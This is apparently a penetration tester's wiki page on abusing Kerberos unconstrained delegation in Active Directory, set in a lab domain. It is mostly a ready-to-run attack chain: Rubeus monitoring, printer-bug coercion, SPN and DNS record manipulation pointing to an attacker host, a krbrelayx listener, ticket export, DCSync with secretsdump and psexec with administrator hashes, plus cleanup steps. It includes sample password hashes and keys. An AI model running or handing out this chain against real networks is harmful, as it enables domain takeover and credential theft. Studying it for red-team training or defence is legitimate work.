---
description: >-
  Unconstrained delegation allows a service, here WEBSRV, to impersonate a user
  when accessing any other service. This is a very permissive and dangerous
  privilege, therefore, not any user can grant it.
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/unconstrained-delegation
---

# Unconstrained Delegation

<figure><img src="../../../../.gitbook/assets/Screenshot 2026-06-19 at 1.17.31 in the afternoon.png" alt=""><figcaption></figcaption></figure>

For an account to have an unconstrained delegation, on the `Delegation` tab of the account, the `Trust this computer for delegation to any service (Kerberos only)` option must be selected.

## ![](<../../../../.gitbook/assets/image (23).png>)

#### What actually happens on the wire

Once <mark style="color:$danger;">`TRUSTED_FOR_DELEGATION`</mark> is set on a service account:

```
Example

Suppose FILE01 needs to access SQL01 for Alice.
##Without delegation:
FILE01 cannot authenticate as Alice

##With unconstrained delegation:
FILE01 has Alice's TGT
So FILE01 can ask the DC:
"Give me a ticket to SQL01 as Alice"

##The DC says:
Sure.

FILE01 gets a new service ticket and connects to SQL01 as Alice.
FILE01 --> SQL01
         (as Alice)
This is called delegation.
```

## Abuse from Windows System

First we have to compromised Web Server or Unconstrained Delegation System.

<figure><img src="../../../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

### Verify Print Spooler

```powershell
PS C:\> dir \\dc01\pipe\spoolss


    Directory: \\dc01\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
                                                 spoolss
```

### Monitor

Launch **Rubeus** from an administrative command prompt

```powershell
C:\Tools>Rubeus.exe monitor /interval:10 /filteruser:DC01$
```

### Printer Bug

```powershell
C:\Tools>SpoolSample.exe DC01 WEBSRV01
```

### Pass The Ticket

```powershell
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
```

With Domain Controller ticket, we can used it for DCSync Attack, and craft golden ticket.

## Abuse from Linux System

### FindDelegation

```python
└─$ impacket-findDelegation vulnableone.local/khan.chanthou:Password123
```

### Addspn

We have to compromised password hash of Unconstrained Delegation Machine

```python
└─$ python addspn.py -u 'vulnableone\WEBSRV01$' -p aad3b435b51404eeaad3b435b51404ee:1347522c7646ca052a87a93caca5ea1f -s HOST/evil.vulnableone.local -q dc01.vulnableone.local
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
```

Verify on computer properties

```powershell
PS C:\Tools> Get-DomainComputer -Unconstrained | select samaccountname, serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
WEBSRV01$       {cifs/evil.corp.com, WSMAN/EVIL, WSMAN/evil.corp.com, TERMSRV/EVIL...}
```

The **“**_**–additional**_**”** flag will modified service principal name of the machine account via the “_**msDS-AdditionalDnsHostName**_” attribute to include the **“HOST/evil.vulnableone.local”** service principal name.

```python
└─$ python addspn.py -u 'vulnableone\WEBSRV01$' -p aad3b435b51404eeaad3b435b51404ee:1347522c7646ca052a87a93caca5ea1f -s HOST/evil.vulnableone.local dc01.vulnableone.local --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

### dnstool

Utilizing the “_**dnstool**_” Add a DNS record pointing to the attacker's host:

```python
└─$ python3 dnstool.py -u 'vulnableone\WEBSRV01$' -p aad3b435b51404eeaad3b435b51404ee:1347522c7646ca052a87a93caca5ea1f -r evil.vulnableone.local -d 10.10.10.11 --action add dc01.vulnableone.local
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Check that the record was added successfully

```bash
└─$ nslookup evil.vulnableone.local 10.10.10.10  
Server:         10.10.10.10 
Address:        10.10.10.10#53

Name:   evil.vulnableone.local
Address: 10.10.10.11
```

### **krbrelayx**

Start **krbrelayx.py** providing AES key of the owned computer account that was dumped earlier in order to be used for Kerberos authentication. Two listeners will be created by default **SMB** and **HTTP**.

```python
└─$ python krbrelayx.py -aesKey 13aa2b4efc4bbab2ec9804cd9c39965ce4a6a6438e2f12ca124c4b75ff47127
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections

```

### printerbug

```python
└─$ python printerbug.py -hashes aad3b435b51404eeaad3b435b51404ee:1347522c7646ca052a87a93caca5ea1f vulnableone.local/WEBSRV01\$@dc01.vulnableone.local evil.vulnableone.local
[*] Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attempting to trigger authentication via rprn RPC at dc01.corp.com
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

### Export Ticket:

```bash
└─$ export KRB5CCNAME=./DC01\$@VULNABLEONE.LOCAL_krbtgt@VULNABLEONE.LOCAL.ccache 

└─$ klist                                                                                                                        
Ticket cache: FILE:./DC01$@VULNABLEONE.LOCAL_krbtgt@VULNABLEONE.LOCAL.ccache
Default principal: DC01$@VULNABLEONE.LOCAL

Valid starting       Expires              Service principal
02/25/2024 13:30:16  02/25/2024 23:29:38  krbtgt/VULNABLEONE.LOCAL@VULNABLEONE.LOCAL
        renew until 03/03/2024 13:29:38
```

### Impacket-Secretsdump

```
impacket-secretsdump dc01.vulnableone.local -dc-ip 10.10.10.10 -just-dc-user 'vulnableone\administrator' -k -no-pass
```

### Impacket-Psexec

```
└─$ impacket-psexec vulnableone.local/administrator@dc01.vulnableone.local -hashes aad3b435b51404eeaad3b435b51404ee:a6b922ecd4785badb8b50bc175c10134
```

## Cleanup

### Remove SPN

```bash
└─$ python addspn.py -u 'vulnableone\WEBSRV01$' -p aad3b435b51404eeaad3b435b51404ee:1347522c7646ca052a87a93caca5ea1f -s HOST/evil.vulnableone.local -r DC01.vulnableone.local --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

### Remove DNS Record

```bash
└─$ python dnstool.py -u 'vulnableone\WEBSRV01$' -p aad3b435b51404eeaad3b435b51404ee:1347522c7646ca052a87a93caca5ea1f -r evil.vulnableone.local -d 10.10.10.11 --action remove DC01.vulnableone.local      
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Target has only one record, tombstoning it
[+] LDAP operation completed successfully
```
